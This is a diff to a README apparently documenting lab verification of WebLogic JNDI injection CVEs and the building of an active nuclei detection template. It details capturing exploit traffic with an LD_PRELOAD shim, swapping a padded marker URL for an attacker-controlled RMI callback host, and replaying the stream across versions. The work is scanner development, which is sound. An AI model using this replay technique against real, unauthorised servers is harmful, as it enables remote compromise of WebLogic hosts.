@@ -6,11 +6,13 @@ Result of the "port-from-PoC + verify-in-lab" effort for the T3/IIOP JNDI CVEs.
 
 | Item | Status |
 |------|--------|
-| Lab | `container-registry.oracle.com/middleware/weblogic:12.2.1.4`, T3 on `127.0.0.1:7001`, HELO → `12.2.1.4.0` |
-| CVE-2023-21839 active nuclei template (upstream) | **MATCHED** on the lab (interactsh DNS callback) |
-| CVE-2024-20931 exploit | **FIRED** — server made an outbound JRMP/RMI callback (`0x4a524d49` = `JRMI`) to our listener |
+| Lab A | `container-registry.oracle.com/middleware/weblogic:12.2.1.4`, T3 on `127.0.0.1:7001`, HELO → `12.2.1.4.0` |
+| Lab B | `container-registry.oracle.com/middleware/weblogic:14.1.1.0-dev-11`, T3 on `127.0.0.1:7101`, HELO → `14.1.1.0.0` |
+| CVE-2023-21839 active nuclei template (upstream) | **MATCHED** on Lab A (interactsh DNS callback) |
+| CVE-2024-20931 exploit — Java PoC | **FIRED** on Lab A — server JRMP/RMI callback (`0x4a524d49` = `JRMI`) |
+| CVE-2024-20931 active nuclei template (`../Nuclei template/CVE-2024-20931-active-oast.yaml`) | **MATCHED on both Lab A AND Lab B** with identical bytes — see `../Nuclei template/README.md` |
 
-CVE-2024-20931 proof (listener output):
+CVE-2024-20931 proof (listener output, Lab A):
 
 ```
 [2026-10-01T16:53:15] CALLBACK from ('127.0.0.1', 63346)
@@ -46,29 +48,56 @@ docker exec wls12214 bash -lc 'cd /tmp/poc && java -cp out:$ORACLE_HOME/wlserver
 A `CALLBACK from ...` line = vulnerable. Against a real target use an interactsh/Burst
 Collaborator host instead of `host.docker.internal:18099`.
 
-## 4. Why there is no verified *nuclei* template for 20931/21006/21182
+## 4. How the nuclei JS port was done — pipeline
 
-These are **JNDI injection** bugs: they need a stateful T3 **`rebind` + `lookup`** RMI
-exchange (store the malicious `ForeignOpaqueReference`, then look it up). That is
-fundamentally different from a single-shot deserialization payload (e.g.
-CVE-2021-2135) that can be captured once and replayed.
+The CVE-2024-20931 active nuclei template was built by **capture → replay**, not
+by re-implementing the T3/RMI state machine. The pipeline (reusable for other
+T3/IIOP JNDI CVEs):
 
-Attempts to capture the T3 wire bytes for a nuclei `javascript:` port were blocked
-because:
+1. **Capture.** A transparent TCP proxy does **not** work — WebLogic's RJVM
+   negotiates/validates peer addresses bidirectionally, so through a MITM the
+   server stops after the 59-byte `HELO`. Inside the Oracle Linux 7.9 container
+   there is no `strace`/`tcpdump` either (`NET_RAW` is dropped). The enabler is
+   an in-process `LD_PRELOAD` shim (`sockdump.c`) that hooks libc
+   `read`/`write`/`send`/`recv` and dumps per-fd buffers. Install `gcc` via
+   `yum` as root (`docker exec -u 0 ...`) and build:
+   ```sh
+   gcc -shared -fPIC -o sockdump.so sockdump.c -ldl
+   LD_PRELOAD=/tmp/poc/sockdump.so java com.supeream.CVE_2024_20931 ...
+   ```
+   Produces `cap_w_<fd>.bin` (client→server) and `cap_r_<fd>.bin` (server→client).
 
-1. **A transparent proxy breaks T3.** WebLogic's RJVM layer negotiates/validates
-   peer addresses bidirectionally; through a MITM the server stops after the
-   59-byte `HELO` and the client hangs. The exploit only completes on a *direct*
-   single socket (client-port == advertised-port).
-2. **No in-container capture tooling.** The image has no `strace`, `gcc`
-   (for an `LD_PRELOAD` shim) or `tcpdump` to record the direct run.
-3. Even with bytes, a T3 `rebind`+`lookup` is **stateful** (session JVMIDs,
-   abbreviation tables) — not a clean replay. A nuclei port would mean
-   re-implementing the T3/RMI state machine in JS, the way ProjectDiscovery
-   re-implemented the **IIOP** state machine (with live key extraction) for
-   CVE-2023-21839.
+2. **Replay-friendly capture.** Re-run the PoC with a **fixed-width marker URL**
+   (e.g. `rmi://` + 90 × `A` = 96 bytes). Later substituting any 96-byte URL
+   keeps every T3 header + Java serialization length field valid — no length
+   math needed.
 
-So the honest active-coverage is: **upstream `CVE-2023-21839` nuclei template
-(verified here)** for the JNDI primitive, plus these **lab-verified Java PoCs**
-for the specific bypasses, plus the version-detection templates in
-`../Nuclei template/`.
+3. **Replay as nuclei `javascript:`.** The template embeds `handshake` and
+   `body` hex, does one `body.replace(mark_hex, url_hex)`, sends on a single
+   socket, and holds the connection open with `c.RecvFull(1000000)` so the
+   server completes the lookup+callback before `Close()` (closing too early is
+   why the first drafts "No results found" despite correct bytes). The attacker
+   URL is `rmi://{{interactsh-url}}:1099/` padded to 96 bytes.
+
+4. **Sign the template** — nuclei refuses unsigned `javascript:` templates.
+   `nuclei -sign -t <file>` once (empty passphrase OK), then
+   `nuclei -t <file> -u target:7001`.
+
+## 5. Version independence (why one capture covers 12.2.1.4 and 14.1.1)
+
+Decompiling `weblogic.deployment.jms.ForeignOpaqueReference` from `weblogic.jar`:
+
+```
+$ javap -p weblogic.deployment.jms.ForeignOpaqueReference | grep serialVersionUID
+  static final long serialVersionUID;
+
+$ serialver weblogic.deployment.jms.ForeignOpaqueReference
+  = 4404892619941441265L     # 0x3d21527fed596ef1
+```
+
+The exact byte sequence `3d 21 52 7f ed 59 6e f1` appears on the wire too — UID
+is a **hard-coded constant** (so Oracle's own Foreign JMS configurations keep
+serializing compatibly across releases). Hence replaying the 12.2.1.4 stream
+against 14.1.1 works unchanged (empirically confirmed above). If a future
+version ever changes the UID, add a `HELO`-based branch — the handshake reports
+the server version precisely.
